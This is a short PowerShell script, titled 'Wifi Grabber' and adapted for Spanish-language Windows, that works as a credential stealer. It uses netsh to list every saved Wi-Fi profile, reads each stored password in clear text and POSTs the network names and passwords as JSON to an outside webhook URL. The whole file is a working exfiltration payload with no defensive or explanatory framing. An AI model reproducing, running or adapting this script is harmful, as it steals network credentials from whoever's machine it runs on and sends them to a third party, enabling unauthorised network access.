<#
    Title: Wifi Grabber – Webhook Español
    Author: I am Jakoby (modificado para Win-ES)
    Desc: Extrae perfiles Wi-Fi y envía nombre+clave a un webhook
#>

# URL de tu webhook
$webhook = 'https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64'

# 1) Recolectar perfiles
$perfiles = netsh wlan show profiles `
    | Select-String 'Perfil de usuario\s*:\s*(.+)$' `
    | ForEach-Object {
        $nombre = $_.Matches[0].Groups[1].Value.Trim()
        # 2) Obtener detalles de cada perfil, incluida la contraseña
        $detalles = netsh wlan show profile name="$nombre" key=clear
        $claveLine = $detalles | Select-String 'Contenido de la clave\s*:\s*(.+)$'
        $clave     = if ($claveLine) { $claveLine.Matches[0].Groups[1].Value.Trim() } else { '' }
        [PSCustomObject]@{
            Profile  = $nombre
            Password = $clave
        }
    }

# 3) Convertir a JSON y POSTear
$json = $perfiles | ConvertTo-Json
try {
    Invoke-RestMethod -Uri $webhook `
                      -Method Post `
                      -ContentType 'application/json' `
                      -Body $json
    Write-Host "✅ Datos enviados."
}
catch {
    Write-Error "❌ Error al enviar: $_"
}

# 4) Pausa para ver posibles errores si lo ejecutas manualmente
Read-Host -Prompt 'Presiona Enter para cerrar'
